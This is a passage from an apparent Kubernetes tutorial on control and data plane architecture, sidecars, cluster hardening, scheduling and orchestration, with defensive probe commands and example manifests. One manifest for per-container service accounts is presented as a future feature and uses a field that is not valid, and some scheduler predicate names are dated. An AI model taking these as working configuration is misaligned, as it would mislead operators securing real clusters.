│  │  kube-controller-manager (pod)   │ │
│  └──────────────────────────────────┘ │
│  Control plane components run as      │
│  static pods managed by kubelet       │
└────────────────────────────────────────┘
```

**Option 3: External etcd (High Availability)**
```
┌─────────────────────┐
│  ETCD CLUSTER       │
│  (separate VMs)     │
│  etcd-1, etcd-2,    │
│  etcd-3 (Raft)      │
└──────────┬──────────┘
           │ 2379/TCP (client), 2380/TCP (peer)
┌──────────▼──────────┐
│  CONTROL PLANE      │
│  api-server-1       │
│  api-server-2       │
│  scheduler, ctlrs   │
└─────────────────────┘
```

---

## Data Plane Deep Dive

### Purpose
- **Workload execution**: Runs application containers (pods)
- **Traffic routing**: Handles ingress/egress, service load balancing
- **Resource management**: CPU/memory allocation, cgroup enforcement
- **Local storage**: EmptyDir, HostPath, CSI volume mounts

### Components & Responsibilities

| **Component** | **Role** | **Failure Impact** |
|--------------|---------|-------------------|
| **kubelet** | Node agent; watches API server for pod specs | Pods on node stop being monitored; node marked NotReady after 40s |
| **Container Runtime** | Pulls images, creates/stops containers | Cannot start new containers; existing containers unaffected |
| **kube-proxy** | Maintains iptables/ipvs rules for Services | Service traffic fails; pod-to-pod direct IP still works |
| **CNI Plugin** | Assigns pod IPs, enforces NetworkPolicies | New pods can't get IPs; existing pods unaffected |
| **Pods** | Application containers + sidecars | Only this workload fails; cluster unaffected |

### Communication Flow: Control Plane → Data Plane

```
1. User submits deployment:
   kubectl create deployment nginx --image=nginx --replicas=3

2. kubectl → API Server (HTTPS 6443):
   POST /apis/apps/v1/namespaces/default/deployments
   {spec: {replicas: 3, template: {...}}}

3. API Server:
   - Authenticates request (client cert, token)
   - Authorizes via RBAC
   - Validates schema
   - Runs admission webhooks
   - Persists to etcd

4. Deployment Controller (watches API server):
   - Detects new Deployment
   - Creates ReplicaSet object via API server
   - API server persists ReplicaSet to etcd

5. ReplicaSet Controller:
   - Detects ReplicaSet with 0/3 pods
   - Creates 3 Pod objects via API server (status: Pending)

6. Scheduler (watches API server for unscheduled pods):
   - Fetches Pod specs
   - Scores nodes (resources, affinity, taints)
   - Binds Pod to node-1, node-2, node-3 (updates Pod.spec.nodeName)

7. Kubelet on node-1 (watches API server):
   - Detects Pod assigned to node-1
   - Calls CRI (containerd) to pull nginx image
   - Creates container with namespaces/cgroups
   - Reports status back to API server (Running)

8. kube-proxy on all nodes (watches Service/Endpoint changes):
   - Creates iptables DNAT rules for Service ClusterIP
   - Load balances to pod IPs (10.244.1.5, 10.244.2.8, 10.244.3.12)
```

### API Server as Single Control Point

```
                     ┌──────────────────┐
                     │  kube-apiserver  │
                     │  (TLS 6443)      │
                     └────────┬─────────┘
                              │
        ┌─────────────────────┼─────────────────────┐
        │                     │                     │
        ▼                     ▼                     ▼
   ┌─────────┐         ┌──────────┐         ┌──────────┐
   │scheduler│         │controllers│        │cloud-ctlr│
   │(watches)│         │ (watches) │        │ (watches)│
   └─────────┘         └──────────┘         └──────────┘
   
   Control plane components never talk directly to each other
   All communication is mediated by API server (watch + update)
   
        │                     │                     │
        └─────────────────────┼─────────────────────┘
                              │
                              ▼
                     ┌──────────────────┐
                     │      etcd        │
                     │  (Raft cluster)  │
                     └──────────────────┘
                     
                     
        │ TLS + client certs
        ▼
   ┌─────────┐         ┌──────────┐         ┌──────────┐
   │ kubelet │         │ kubelet  │         │ kubelet  │
   │ node-1  │         │ node-2   │         │ node-3   │
   └─────────┘         └──────────┘         └──────────┘
   Data plane components never talk to control plane directly
   except through API server
```

**Key Security Principle**: API server is the **only** entry point. No component talks to etcd directly except API server.

---

## What is a Sidecar?

A **sidecar** is a container running in the same pod as the main application container, sharing:
- **Network namespace**: Same localhost, same IP address
- **IPC namespace**: Can use shared memory, Unix sockets
- **Volume mounts**: Can access same EmptyDir, ConfigMap, Secret volumes

```
┌────────────────────────────────────────────────────────────┐
│  POD: my-app (IP: 10.244.1.5)                              │
├────────────────────────────────────────────────────────────┤
│                                                            │
│  ┌──────────────────────┐      ┌──────────────────────┐   │
│  │  Main Container      │      │  Sidecar Container   │   │
│  │  (app)               │      │  (log-shipper)       │   │
│  │                      │      │                      │   │
│  │  Port: 8080          │      │  Reads from:         │   │
│  │  Writes logs to:     │◄────►│  /var/log/app.log    │   │
│  │  /var/log/app.log    │      │  Ships to:           │   │
│  │                      │      │  Elasticsearch       │   │
│  └──────────────────────┘      └──────────────────────┘   │
│           │                             │                 │
│           │ Shared Localhost            │                 │
│           └─────────────────────────────┘                 │
│                                                            │
│  Shared Volumes:                                           │
│  ┌──────────────────────────────────────────────────────┐ │
│  │  /var/log (EmptyDir)                                 │ │
│  │  - app writes logs                                   │ │
│  │  - sidecar reads logs                                │ │
│  └──────────────────────────────────────────────────────┘ │
└────────────────────────────────────────────────────────────┘
```

### Common Sidecar Patterns

#### 1. **Service Mesh Proxy (Envoy/Istio)**
```yaml
apiVersion: v1
kind: Pod
metadata:
  name: app-with-sidecar
spec:
  containers:
  - name: app
    image: myapp:1.0
    ports:
    - containerPort: 8080
  
  - name: envoy-proxy  # Sidecar
    image: envoyproxy/envoy:v1.28
    ports:
    - containerPort: 15001  # Intercepts all traffic
    env:
    - name: ENVOY_UID
      value: "0"
```

**How it works**:
```
External Request → NodePort/LoadBalancer
                ↓
            kube-proxy (iptables)
                ↓
         Pod IP (10.244.1.5)
                ↓
    ┌───────────────────────┐
    │ iptables rules set by │
    │ istio-init (initContainer)
    │ redirect all traffic  │
    │ to Envoy (port 15001) │
    └───────────┬───────────┘
                ↓
    ┌───────────────────────┐
    │  Envoy Sidecar        │
    │  • mTLS termination   │
    │  • AuthZ (RBAC)       │
    │  • Metrics collection │
    │  • Circuit breaking   │
    │  • Load balancing     │
    └───────────┬───────────┘
                ↓ localhost:8080
    ┌───────────────────────┐
    │  App Container        │
    │  (thinks it's direct) │
    └───────────────────────┘
```

**Verification**:
```bash
# Deploy with Istio injection
kubectl label namespace default istio-injection=enabled
kubectl apply -f deployment.yaml

# Check sidecar is injected
kubectl get pod myapp-xyz -o jsonpath='{.spec.containers[*].name}'
# Output: myapp istio-proxy

# Verify Envoy is intercepting traffic
kubectl exec myapp-xyz -c istio-proxy -- curl localhost:15000/stats | grep upstream_rq_total
```

#### 2. **Log Shipping (Fluent Bit)**
```yaml
apiVersion: v1
kind: Pod
metadata:
  name: app-with-logging
spec:
  containers:
  - name: app
    image: myapp:1.0
    volumeMounts:
    - name: logs
      mountPath: /var/log
  
  - name: fluent-bit  # Sidecar
    image: fluent/fluent-bit:2.0
    volumeMounts:
    - name: logs
      mountPath: /var/log
      readOnly: true
    - name: fluent-config
      mountPath: /fluent-bit/etc/
  
  volumes:
  - name: logs
    emptyDir: {}
  - name: fluent-config
    configMap:
      name: fluent-bit-config
```

#### 3. **Secrets Injection (Vault Agent)**
```yaml
apiVersion: v1
kind: Pod
metadata:
  name: app-with-secrets
spec:
  serviceAccountName: app-sa
  
  initContainers:
  - name: vault-agent-init
    image: vault:1.15
    args:
    - agent
    - -config=/vault/config/agent.hcl
    volumeMounts:
    - name: vault-token
      mountPath: /vault/token
    - name: secrets
      mountPath: /vault/secrets
  
  containers:
  - name: app
    image: myapp:1.0
    volumeMounts:
    - name: secrets
      mountPath: /secrets
      readOnly: true
  
  volumes:
  - name: vault-token
    emptyDir: {}
  - name: secrets
    emptyDir: {}
```

**How it works**:
1. Vault Agent authenticates via Kubernetes service account JWT
2. Fetches secrets from Vault
3. Writes secrets to shared EmptyDir volume
4. App reads secrets from `/secrets/db-password` (no Vault SDK needed)

#### 4. **Security Scanning (Falco)**
```yaml
- name: falco-sidecar
  image: falcosecurity/falco:0.36
  securityContext:
    privileged: true  # Needs kernel access for syscall tracing
  volumeMounts:
  - name: dev
    mountPath: /host/dev
  - name: proc
    mountPath: /host/proc
    readOnly: true
```

---

## Security Implications: Control Plane vs Data Plane

### Threat Model

```
┌─────────────────────────────────────────────────────────────┐
│  CONTROL PLANE COMPROMISE = CLUSTER COMPROMISE             │
├─────────────────────────────────────────────────────────────┤
│  Attacker gains access to:                                  │
│  • etcd → reads all secrets, cluster state                 │
│  • API server → creates admin service accounts             │
│  • Scheduler → schedules malicious pods on all nodes       │
│  • Controllers → modifies deployments, injects backdoors   │
│                                                             │
│  Impact: FULL CLUSTER TAKEOVER                             │
└─────────────────────────────────────────────────────────────┘

┌─────────────────────────────────────────────────────────────┐
│  DATA PLANE COMPROMISE = NODE/WORKLOAD COMPROMISE          │
├─────────────────────────────────────────────────────────────┤
│  Attacker gains access to:                                  │
│  • Node → accesses pods on that node only                  │
│  • Pod → lateral movement to other pods on same node       │
│  • Sidecar → intercepts traffic, steals secrets            │
│                                                             │
│  Impact: LIMITED (unless privilege escalation to control)  │
└─────────────────────────────────────────────────────────────┘
```

### Control Plane Hardening

| **Attack Vector** | **Mitigation** |
|------------------|----------------|
| **etcd unauthenticated access** | Bind to localhost, mTLS client/peer auth, firewall (only API server → etcd), encrypt secrets at rest |
| **API server anonymous auth** | `--anonymous-auth=false`, `--authorization-mode=Node,RBAC`, audit logging |
| **Weak RBAC** | Least privilege, no `cluster-admin` for workloads, regular RBAC audits (`kubectl auth can-i --list`) |
| **Admission webhook bypass** | Use `ValidatingWebhookConfiguration` with `failurePolicy: Fail`, verify webhook TLS certs |
| **Control plane node SSH** | Disable SSH, use bastion host, SSM Session Manager (AWS), certificate-based auth only |

**Commands**:
```bash
# 1. Verify etcd is not publicly accessible
sudo netstat -tlnp | grep 2379
# Should bind to 127.0.0.1 or private IP only

# 2. Test API server anonymous auth (should fail)
curl -k https://<api-server-ip>:6443/api/v1/namespaces
# Expected: {"kind":"Status","status":"Failure","code":401}

# 3. Check RBAC permissions for default service account
kubectl auth can-i --list --as=system:serviceaccount:default:default
# Should have minimal permissions (NOT create pods, secrets)

# 4. Enable audit logging
# Add to kube-apiserver manifest:
# --audit-policy-file=/etc/kubernetes/audit-policy.yaml
# --audit-log-path=/var/log/kubernetes/audit.log

# 5. Encrypt secrets at rest
# Create EncryptionConfiguration:
apiVersion: apiserver.config.k8s.io/v1
kind: EncryptionConfiguration
resources:
  - resources:
      - secrets
    providers:
      - aescbc:
          keys:
            - name: key1
              secret: <base64-encoded-32-byte-key>
      - identity: {}

# Add to kube-apiserver:
# --encryption-provider-config=/etc/kubernetes/encryption-config.yaml

# 6. Verify encryption
kubectl create secret generic test --from-literal=key=value
sudo ETCDCTL_API=3 etcdctl get /registry/secrets/default/test --print-value-only | hexdump -C
# Should see encrypted data (k8s:enc:aescbc:v1:key1:...)
```

### Data Plane Hardening

| **Attack Vector** | **Mitigation** |
|------------------|----------------|
| **Kubelet API exposed** | `--anonymous-auth=false`, `--authorization-mode=Webhook`, firewall (only control plane → kubelet) |
| **Privileged containers** | Pod Security Standards (restricted), `allowPrivilegeEscalation: false`, drop all capabilities |
| **Host namespace access** | Disable `hostNetwork`, `hostPID`, `hostIPC`, use NetworkPolicy |
| **Container escape** | Use gVisor/Kata Containers (RuntimeClass), AppArmor/SELinux, seccomp profiles |
| **Sidecar compromise** | Separate service accounts per container (KEP-2872), NetworkPolicy between containers |

**Commands**:
```bash
# 1. Verify kubelet auth
curl -k https://<node-ip>:10250/pods
# Expected: 401 Unauthorized

# 2. Enforce Pod Security Standards
kubectl label --overwrite ns default \
  pod-security.kubernetes.io/enforce=restricted \
  pod-security.kubernetes.io/audit=restricted \
  pod-security.kubernetes.io/warn=restricted

# 3. Test privileged pod rejection
cat <<EOF | kubectl apply -f -
apiVersion: v1
kind: Pod
metadata:
  name: test-privileged
spec:
  containers:
  - name: nginx
    image: nginx
    securityContext:
      privileged: true
EOF
# Should fail: violates PodSecurity "restricted:latest"

# 4. Use RuntimeClass for isolation
cat <<EOF | kubectl apply -f -
apiVersion: node.k8s.io/v1
kind: RuntimeClass
metadata:
  name: gvisor
handler: runsc
EOF

# Deploy with gVisor
apiVersion: v1
kind: Pod
metadata:
  name: secure-pod
spec:
  runtimeClassName: gvisor
  containers:
  - name: app
    image: myapp:1.0

# 5. NetworkPolicy: deny sidecar → external
apiVersion: networking.k8s.io/v1
kind: NetworkPolicy
metadata:
  name: deny-sidecar-egress
spec:
  podSelector:
    matchLabels:
      app: myapp
  policyTypes:
  - Egress
  egress:
  - to:
    - podSelector: {}  # Only pod-to-pod within namespace
```

---

## Sidecar Security Concerns

| **Risk** | **Scenario** | **Mitigation** |
|---------|-------------|----------------|
| **Sidecar compromise** | Attacker exploits Envoy CVE, gains shell in sidecar | Separate service accounts (KEP-2872), NetworkPolicy restricting sidecar, auto-update sidecars |
| **Secrets leakage** | Sidecar logs secrets, sends to external logging | Filter secrets in log shipper config, use secret scrubbing (e.g., Fluent Bit filters) |
| **Traffic interception** | Malicious sidecar MITMs app traffic | mTLS between sidecar and app (Istio STRICT mode), verify sidecar image signature (Sigstore) |
| **Resource exhaustion** | Sidecar consumes all CPU/memory | Set resource requests/limits, use LimitRange, monitor sidecar metrics |

**Example: Separate service accounts per container (future KEP-2872)**:
```yaml
apiVersion: v1
kind: Pod
metadata:
  name: multi-sa-pod
spec:
  containers:
  - name: app
    image: myapp:1.0
    serviceAccountName: app-sa  # Can read ConfigMaps
  
  - name: log-shipper
    image: fluent/fluent-bit:2.0
    serviceAccountName: log-shipper-sa  # Can write to logging backend
```

---

## Testing & Validation

```bash
# 1. Verify control plane → data plane communication
kubectl get nodes -v=6  # Shows API requests
# Look for: GET https://<api-server>:6443/api/v1/nodes

# 2. Test kubelet authentication
NODE_IP=$(kubectl get node worker-1 -o jsonpath='{.status.addresses[?(@.type=="InternalIP")].address}')
curl -k https://${NODE_IP}:10250/pods
# Expected: 401 (good) or 403 (good)

# 3. Simulate control plane failure
# Stop API server on one master
sudo systemctl stop kube-apiserver

# Verify HA: kubectl should still work (hits other API server)
kubectl get nodes

# 4. Simulate data plane failure
# Stop kubelet on worker-1
sudo systemctl stop kubelet

# Node marked NotReady after 40s
kubectl get nodes -w

# Pods on worker-1 evicted after 5 minutes (default)
kubectl get pods -o wide

# 5. Test sidecar traffic interception
# Deploy app with Istio sidecar
kubectl apply -f <(istioctl kube-inject -f deployment.yaml)

# Verify mTLS
kubectl exec myapp-xyz -c istio-proxy -- curl localhost:15000/config_dump | grep -A 10 tls_context

# 6. Benchmark sidecar overhead
# Without sidecar
kubectl run test --image=nginx --restart=Never
ab -n 10000 -c 100 http://<pod-ip>/

# With sidecar
kubectl apply -f nginx-with-sidecar.yaml
ab -n 10000 -c 100 http://<pod-ip>/
# Compare latency (typically 1-2ms overhead)

# 7. Test sidecar resource limits
kubectl run resource-hog --image=nginx --restart=Never \
  --overrides='{"spec":{"containers":[{"name":"nginx","image":"nginx"},{"name":"sidecar","image":"busybox","command":["sh","-c","stress --cpu 4"],"resources":{"limits":{"cpu":"100m"}}}]}}'

kubectl top pod resource-hog --containers
# Sidecar should be throttled at 100m CPU
```

---

## Deployment Patterns

### Pattern 1: Managed Control Plane (EKS/GKE/AKS)
```
┌────────────────────────────────┐
│  MANAGED CONTROL PLANE         │
│  (AWS/GCP/Azure responsibility)│
│  • API server (HA)             │
│  • etcd (managed backups)      │
│  • scheduler, controllers      │
│  • Auto-scaling, auto-upgrade  │
└────────────────┬───────────────┘
                 │
                 ▼
┌────────────────────────────────┐
│  YOUR WORKER NODES             │
│  (you provision & manage)      │
│  • EC2/GCE/Azure VMs           │
│  • kubelet, kube-proxy         │
│  • Your application pods       │
└────────────────────────────────┘
```

**Pros**: No control plane ops burden, automatic HA, managed upgrades
**Cons**: Less control, vendor lock-in, can't access etcd directly

### Pattern 2: Self-Managed (kubeadm, Kops)
```
┌────────────────────────────────┐
│  YOUR CONTROL PLANE NODES      │
│  (you provision & manage)      │
│  • API server (you configure)  │
│  • etcd (you backup)           │
│  • scheduler, controllers      │
│  • Manual upgrades             │
└────────────────┬───────────────┘
                 │
                 ▼
┌────────────────────────────────┐
│  YOUR WORKER NODES             │
│  (you provision & manage)      │
└────────────────────────────────┘
```

**Pros**: Full control, can run on-prem, no vendor lock-in
**Cons**: Operational burden (etcd backups, HA, upgrades, monitoring)

---

## Failure Modes

| **Failure** | **Detection** | **Impact** | **Recovery** |
|-----------|-------------|----------|------------|
| **etcd quorum loss** | `etcdctl endpoint health` fails | Cluster read-only | Restore from backup (`etcdctl snapshot restore`) |
| **API server down** | `kubectl get nodes` fails | No control plane operations | Restart API server, check logs (`journalctl -u kube-apiserver`) |
| **All schedulers down** | New pods stuck in Pending | Existing pods unaffected | Restart scheduler, check for resource constraints |
| **Kubelet crash** | Node shows NotReady | Pods on node inaccessible | Restart kubelet (`systemctl restart kubelet`), check logs |
| **Sidecar OOM** | Pod CrashLoopBackOff | Main app may fail if dependent on sidecar | Increase sidecar memory limits, check for memory leaks |
| **Control plane network partition** | Controllers can't reach API server | No reconciliation | Fix network, check firewall rules, verify DNS |

---

## Next 3 Steps

1. **Deploy a 3-node cluster with external etcd**: Use kubeadm to create 3 control plane nodes + 3 etcd nodes + 3 workers. Verify mTLS between API server ↔ etcd, enable audit logging, test etcd backup/restore.
   ```bash
   # External etcd setup
   sudo kubeadm init --config=kubeadm-config.yaml --upload-certs
   # kubeadm-config.yaml:
   # apiServer:
   #   extraArgs:
   #     etcd-servers: https://etcd-1:2379,https://etcd-2:2379,https://etcd-3:2379
   ```

2. **Implement sidecar pattern with Istio**: Deploy a microservice app, inject Envoy sidecar, enable mTLS (STRICT mode), verify traffic is encrypted (`istioctl authn tls-check`), add AuthorizationPolicy (deny-by-default), benchmark latency overhead.
   ```bash
   istioctl install --set profile=demo
   kubectl label namespace default istio-injection=enabled
   kubectl apply -f bookinfo.yaml
   ```

3. **Simulate control plane and data plane failures**: Stop one etcd node (verify quorum maintained), kill all API servers (verify cluster becomes unavailable), drain a worker node (verify pods reschedule), inject network latency between control plane and data plane (verify timeout behaviors with `tc qdisc`).

---

## References

- **Kubernetes Architecture**: https://kubernetes.io/docs/concepts/architecture/
- **Control Plane Components**: https://kubernetes.io/docs/concepts/overview/components/#control-plane-components
- **Node Components**: https://kubernetes.io/docs/concepts/overview/components/#node-components
- **Sidecar Containers KEP**: https://github.com/kubernetes/enhancements/tree/master/keps/sig-node/753-sidecar-containers
- **Istio Architecture**: https://istio.io/latest/docs/ops/deployment/architecture/
- **etcd Disaster Recovery**: https://etcd.io/docs/latest/op-guide/recovery/

## Summary

**Scheduling** is the decision of **which physical node runs which pod** based on resource availability, constraints, and policies. **Orchestration** is the continuous management of workload lifecycle—creating, updating, scaling, healing, and deleting resources to maintain desired state. The scheduler assigns pods to nodes once; orchestration (controllers) continuously reconciles actual vs. desired state across the cluster. Scheduling is a one-time placement decision; orchestration is ongoing state management. Both are decision-making processes in the control plane that directly impact workload placement, availability, and security isolation. Poor scheduling can lead to resource starvation or co-location of sensitive workloads; weak orchestration can fail to recover from failures or enforce security policies.

---

## Scheduling: Pod Placement Decisions

### What is Scheduling?

The **kube-scheduler** watches for pods with `spec.nodeName` unset (pending pods) and assigns them to nodes. This decision considers:

```
┌─────────────────────────────────────────────────────────────┐
│              SCHEDULING DECISION WORKFLOW                   │
├─────────────────────────────────────────────────────────────┤
│                                                             │
│  1. User creates pod: kubectl run nginx --image=nginx      │
│                                                             │
│  2. API server persists pod with status: Pending           │
│     spec.nodeName: null  ← No node assigned yet            │
│                                                             │
│  3. Scheduler watches for unscheduled pods                 │
│                                                             │
│  4. FILTERING PHASE (Predicates):                          │
│     Remove nodes that CAN'T run this pod                   │
│     ┌──────────────────────────────────────────┐           │
│     │ Node 1: 2 vCPU available, pod needs 4    │ ❌ FAIL   │
│     │ Node 2: Has GPU, pod needs GPU           │ ✅ PASS   │
│     │ Node 3: Tainted, pod has no toleration   │ ❌ FAIL   │
│     │ Node 4: 8 vCPU available, 16GB RAM       │ ✅ PASS   │
│     │ Node 5: In zone=us-west-1a (pod affinity)│ ✅ PASS   │
│     └──────────────────────────────────────────┘           │
│     Remaining nodes: [Node 2, Node 4, Node 5]              │
│                                                             │
│  5. SCORING PHASE (Priorities):                            │
│     Rank remaining nodes (0-100 score)                     │
│     ┌──────────────────────────────────────────┐           │
│     │ Node 2: Score 75 (balanced CPU/RAM)      │           │
│     │ Node 4: Score 92 (most available CPU)    │ ← WINNER  │
│     │ Node 5: Score 60 (low disk space)        │           │
│     └──────────────────────────────────────────┘           │
│                                                             │
│  6. BINDING:                                                │
│     Scheduler updates pod: spec.nodeName = "node-4"        │
│     API server persists binding                            │
│                                                             │
│  7. Kubelet on node-4 sees pod assigned to it              │
│     Creates container via CRI                              │
│                                                             │
└─────────────────────────────────────────────────────────────┘
```

### Scheduling Factors (Predicates & Priorities)

#### Predicates (Filtering - Must Pass)

| **Predicate** | **Check** | **Example** |
|--------------|----------|-------------|
| **NodeResourcesFit** | Node has enough CPU/memory/ephemeral-storage | Pod requests 4 vCPU, node has 2 → FAIL |
| **PodFitsHostPorts** | Node port not already bound | Pod needs port 80, already used → FAIL |
| **CheckNodeCondition** | Node is Ready (not NotReady/Unknown) | Node has MemoryPressure → FAIL |
| **PodToleratesNodeTaints** | Pod has tolerations for node taints | Node tainted `gpu=true:NoSchedule`, pod has no toleration → FAIL |
| **PodMatchesNodeSelector** | Pod nodeSelector matches node labels | Pod requires `disk=ssd`, node has `disk=hdd` → FAIL |
| **PodAffinityMatches** | Pod affinity/anti-affinity rules satisfied | Pod requires co-location with redis, redis not on node → FAIL |
| **VolumeBinding** | Volumes can be bound (PV in same zone as node) | Node in `us-east-1a`, PV in `us-east-1b` → FAIL |
| **NoDiskConflict** | Volumes not already mounted (RWO) | Volume already attached to another node → FAIL |

#### Priorities (Scoring - Best Fit)

| **Priority** | **Score Logic** | **Weight** |
|-------------|----------------|-----------|
| **LeastRequestedPriority** | Prefers nodes with most available resources | 1 |
| **BalancedResourceAllocation** | Prefers balanced CPU/memory usage (avoid skew) | 1 |
| **NodeAffinityPriority** | Higher score for preferred node affinity | 1 |
| **InterPodAffinityPriority** | Score based on pod affinity weight | 1 |
| **ImageLocalityPriority** | Prefers nodes with image already pulled | 1 |
| **TaintTolerationPriority** | Prefers nodes with fewer taints | 1 |

### Example: Scheduling Algorithm Walkthrough

```bash
# Create pod with resource requests and affinity
cat <<EOF | kubectl apply -f -
apiVersion: v1
kind: Pod
metadata:
  name: web-frontend
spec:
  containers:
  - name: nginx
    image: nginx:1.25
    resources:
      requests:
        cpu: 500m
        memory: 512Mi
      limits:
        cpu: 1000m
        memory: 1Gi
  nodeSelector:
    disktype: ssd
  affinity:
    podAntiAffinity:
      requiredDuringSchedulingIgnoredDuringExecution:
      - labelSelector:
          matchExpressions:
          - key: app
            operator: In
            values:
            - web-frontend
        topologyKey: kubernetes.io/hostname
EOF
```

**Scheduler decision process**:

```
Step 1: Fetch all nodes
$ kubectl get nodes
NAME       STATUS   CPU(available)   MEMORY(available)   LABELS
node-1     Ready    1500m            3Gi                 disktype=ssd, zone=us-west-1a
node-2     Ready    500m             2Gi                 disktype=hdd, zone=us-west-1b
node-3     Ready    2000m            4Gi                 disktype=ssd, zone=us-west-1a
node-4     Ready    3000m            8Gi                 disktype=ssd, zone=us-west-1c

Step 2: FILTERING (Predicates)
┌────────────────────────────────────────────────────────┐
│ Predicate: NodeResourcesFit                           │
│ Pod needs: 500m CPU, 512Mi memory                     │
│ node-1: 1500m ≥ 500m ✅, 3Gi ≥ 512Mi ✅ → PASS        │
│ node-2: 500m ≥ 500m ✅, 2Gi ≥ 512Mi ✅ → PASS         │
│ node-3: 2000m ≥ 500m ✅, 4Gi ≥ 512Mi ✅ → PASS        │
│ node-4: 3000m ≥ 500m ✅, 8Gi ≥ 512Mi ✅ → PASS        │
└────────────────────────────────────────────────────────┘

┌────────────────────────────────────────────────────────┐
│ Predicate: PodMatchesNodeSelector                     │
│ Pod requires: disktype=ssd                            │
│ node-1: disktype=ssd ✅ → PASS                        │
│ node-2: disktype=hdd ❌ → FAIL                        │
│ node-3: disktype=ssd ✅ → PASS                        │
│ node-4: disktype=ssd ✅ → PASS                        │
└────────────────────────────────────────────────────────┘

┌────────────────────────────────────────────────────────┐
│ Predicate: PodAntiAffinity                            │
│ Pod requires: no other web-frontend on same hostname  │
│ Assume web-frontend-abc already on node-1             │
│ node-1: Has web-frontend pod ❌ → FAIL                │
│ node-3: No web-frontend pod ✅ → PASS                 │
│ node-4: No web-frontend pod ✅ → PASS                 │
└────────────────────────────────────────────────────────┘

Remaining nodes: [node-3, node-4]

Step 3: SCORING (Priorities)
┌────────────────────────────────────────────────────────┐
│ Priority: LeastRequestedPriority                      │
│ Formula: (capacity - allocated) / capacity * 10       │
│ node-3: (2000m - 1000m) / 2000m * 10 = 5             │
│ node-4: (3000m - 500m) / 3000m * 10 = 8.3            │
└────────────────────────────────────────────────────────┘

┌────────────────────────────────────────────────────────┐
│ Priority: BalancedResourceAllocation                  │
│ Formula: 10 - variance(cpu_fraction, mem_fraction)*10 │
│ node-3: CPU=50%, MEM=37.5% → variance=0.0156 → 8.44  │
│ node-4: CPU=16%, MEM=6.25% → variance=0.0095 → 9.05  │
└────────────────────────────────────────────────────────┘

Final Scores (weighted sum):
node-3: 5 * 1 + 8.44 * 1 = 13.44
node-4: 8.3 * 1 + 9.05 * 1 = 17.35 ← WINNER

Step 4: BINDING
Scheduler binds pod to node-4 (highest score)
```

**Verify scheduling decision**:
```bash
kubectl get pod web-frontend -o wide
# NAME           READY   STATUS    NODE
# web-frontend   1/1     Running   node-4

# View scheduler logs (decision trace)
kubectl logs -n kube-system kube-scheduler-<pod> | grep web-frontend
```

---

## Orchestration: Lifecycle Management Decisions

### What is Orchestration?

**Controllers** continuously watch cluster state and make decisions to reconcile actual state with desired state. This includes:

```
┌─────────────────────────────────────────────────────────────┐
│            ORCHESTRATION DECISION TYPES                     │
├─────────────────────────────────────────────────────────────┤
│                                                             │
│  1. CREATION: Should I create new resources?               │
│     Example: ReplicaSet has 3 desired, 1 actual → Create 2 │
│                                                             │
│  2. SCALING: Should I scale up/down?                        │
│     Example: HPA sees CPU > 80% → Scale replicas 3 → 5     │
│                                                             │
│  3. UPDATE: Should I roll out new version?                 │
│     Example: Deployment image nginx:1.24 → nginx:1.25      │
│              RollingUpdate: maxSurge=1, maxUnavailable=1   │
│                                                             │
│  4. HEALING: Should I replace failed pods?                 │
│     Example: Pod CrashLoopBackOff → Restart with backoff   │
│              Node NotReady → Evict pods after 5 minutes    │
│                                                             │
│  5. DELETION: Should I clean up resources?                 │
│     Example: Job completed → Delete pod after ttl          │
│                                                             │
│  6. BINDING: Should I bind resource to another?            │
│     Example: PVC pending → Bind to available PV            │
│                                                             │
└─────────────────────────────────────────────────────────────┘
```

### Controller Reconciliation Loop

```go
// Simplified controller pseudocode
for {
    // 1. OBSERVE: Watch cluster state via API server
    desiredState := getDesiredState()  // From Deployment spec
    actualState := getActualState()    // From Pod status
    
    // 2. DIFF: Compare desired vs actual
    diff := compare(desiredState, actualState)
    
    // 3. DECIDE: What actions to take?
    if diff.needsCreation {
        createPods(diff.count)
    }
    if diff.needsDeletion {
        deletePods(diff.list)
    }
    if diff.needsUpdate {
        rollingUpdate(diff.oldPods, diff.newSpec)
    }
    
    // 4. ACT: Execute via API server
    for action := range actions {
        apiServer.execute(action)
    }
    
    // 5. UPDATE STATUS: Report back
    updateStatus(actualState)
    
    // 6. SLEEP: Wait for next sync period (default 30s)
    time.Sleep(syncPeriod)
}
```

### Example: Deployment Controller Orchestration

```bash
# Create deployment with 3 replicas
kubectl create deployment nginx --image=nginx:1.24 --replicas=3

# What happens internally:
```

```
T=0s: User creates Deployment
┌────────────────────────────────────────────────────────────┐
│ Deployment Controller OBSERVES:                           │
│ Desired: 3 replicas, image: nginx:1.24                    │
│ Actual: 0 replicas                                        │
│                                                            │
│ DECISION: Create ReplicaSet with 3 replicas               │
│ ACTION: POST /apis/apps/v1/replicasets                    │
└────────────────────────────────────────────────────────────┘

T=1s: ReplicaSet created
┌────────────────────────────────────────────────────────────┐
│ ReplicaSet Controller OBSERVES:                           │
│ Desired: 3 replicas                                        │
│ Actual: 0 pods                                            │
│                                                            │
│ DECISION: Create 3 pods                                   │
│ ACTION: POST /api/v1/namespaces/default/pods (3x)         │
└────────────────────────────────────────────────────────────┘

T=2s: Pods created (Pending)
┌────────────────────────────────────────────────────────────┐
│ Scheduler OBSERVES:                                        │
│ 3 pods with spec.nodeName = null                          │
│                                                            │
│ DECISION: Assign pod-1→node-1, pod-2→node-2, pod-3→node-3 │
│ ACTION: PATCH /api/v1/pods/{name}/binding                 │
└────────────────────────────────────────────────────────────┘

T=3s: Pods scheduled
┌────────────────────────────────────────────────────────────┐
│ Kubelet (node-1) OBSERVES:                                │
│ Pod assigned to node-1, status: Pending                   │
│                                                            │
│ DECISION: Pull image nginx:1.24, create container         │
│ ACTION: CRI.CreateContainer()                             │
│ UPDATE: PATCH /api/v1/pods/{name}/status (Running)        │
└────────────────────────────────────────────────────────────┘

T=10s: All pods Running
┌────────────────────────────────────────────────────────────┐
│ ReplicaSet Controller OBSERVES:                           │
│ Desired: 3 replicas                                        │
│ Actual: 3 pods Running                                    │
│                                                            │
│ DECISION: No action needed (reconciled)                   │
└────────────────────────────────────────────────────────────┘
```

**Update scenario (rolling update)**:

```bash
# Update deployment image
kubectl set image deployment/nginx nginx=nginx:1.25

# Orchestration decisions:
```

```
T=0s: Deployment spec changed
┌────────────────────────────────────────────────────────────┐
│ Deployment Controller OBSERVES:                           │
│ Desired: image nginx:1.25                                 │
│ Actual: ReplicaSet with nginx:1.24                        │
│                                                            │
│ DECISION: Create new ReplicaSet (nginx:1.25)              │
│           Scale new RS: 0 → 1 (maxSurge=1)                │
│           Scale old RS: 3 → 2 (maxUnavailable=1)          │
│ ACTION: POST /apis/apps/v1/replicasets (new)              │
